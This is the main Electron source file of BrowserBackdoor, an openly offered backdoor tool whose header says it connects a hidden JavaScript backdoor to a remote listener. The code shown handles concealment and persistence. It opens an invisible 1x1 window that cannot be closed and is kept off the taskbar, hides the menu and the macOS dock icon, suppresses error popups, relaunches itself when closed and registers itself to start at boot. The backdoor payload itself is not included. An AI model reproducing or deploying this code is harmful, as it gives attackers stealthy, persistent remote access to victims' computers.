/*
 * BrowserBackdoor - https://github.com/IMcPwn/browser-backdoor
 * BrowserBackdoor is an electron application that uses a JavaScript backdoor (in index.html)
 * to connect to the listener (BrowserBackdoorServer).
 * For more information visit: http://imcpwn.com
   
 * MIT License

 * Copyright (c) 2016 IMcPwn 

 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:

 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.

 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

const electron = require('electron');
const AutoLaunch = require('auto-launch');
const app = electron.app;
const dialog = electron.dialog;
const globalShortcut = electron.globalShortcut;
const BrowserWindow = electron.BrowserWindow;
const Menu = electron.Menu;

// Keep a global reference of the window object so it doesn't get garbage collected.
let mainWindow;

// Passing true enables startup, false disables startup.
function manageStartup(enable) {
    let appLauncher = new AutoLaunch({
        // Change this to the name of the application or what
        // should appear in the startup menu.
        name: 'BB'
    });
    if (enable) {
        appLauncher.isEnabled().then(function(enabled){
            if(enabled) return;
            return appLauncher.enable();
        }).then(function(err){
            // If you want to remove all console output, remove lines that contain "console.error(err)"
            if (err !== undefined) console.error(err);
        });
    } else {
        appLauncher.isEnabled().then(function(enabled){
            if(!enabled) return;
            return appLauncher.disable();
        }).then(function(err){
            if (err !== undefined) console.error(err);
        }); 
    }
}

function createWindow() {
    // Change CommandOrControl+Alt+\ to the shortcut to manage the application.
    globalShortcut.register('CommandOrControl+Alt+\\', function () {
        let result = dialog.showMessageBox({
            type: 'info',
            title: 'Shortcut pressed',
            message: 'You pressed the keyboard shortcut. \nIf you do not know what you are doing press cancel.',
            buttons: ['Quit Application', 'Enable Startup', 'Disable Startup', 'Cancel']
        });
        
        if (result === 0) {
            mainWindow = null;
            app.exit(0);
        } else if (result === 1) {
            manageStartup(true);
        } else if (result === 2) {
            manageStartup(false);
        }
    });
    
    // Create a hidden browser window which loads the backdoor.
    mainWindow = new BrowserWindow({
        width: 1,
        height: 1,
        show: false,
        closable: false,
        transparent: true,
        resizable: false,
        skipTaskbar: true
    });

    mainWindow.loadURL(`file://${__dirname}/index.html`);

    // Hide application menu.
    Menu.setApplicationMenu(null);

    mainWindow.on('closed', function() {
        mainWindow = null;
    });
}

// Only allow one instance of the application at a time.
const shouldQuit = app.makeSingleInstance((commandLine, workingDirectory) => {
    if (mainWindow === null) {
        createWindow();
    }
});

if (shouldQuit) {
    mainWindow = null;
    app.exit(0);
}

// Hide application from tray if on OS X.
if (process.platform === 'darwin') {
    app.dock.hide();
}

// Catch uncaughtExceptions so no popups appear on errors.
process.on('uncaughtException', function (err) {
    console.error(err);
});

// Accept --startup as command line argument to enable on startup.
process.argv.forEach(function (val, index, array) {
  if (val === "--startup") {
    manageStartup(true);
  }
});

app.on('before-quit', function() {
    mainWindow = null;
});

app.on('will-quit', function() {
    globalShortcut.unregisterAll();
});

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
app.on('ready', createWindow);

// Re-open if all windows are closed.
app.on('window-all-closed', function() {
    createWindow();
});

app.on('activate', function() {
    // Create window if activated and it doesn't already exist.
    if (mainWindow === null) {
        createWindow();
    }
});
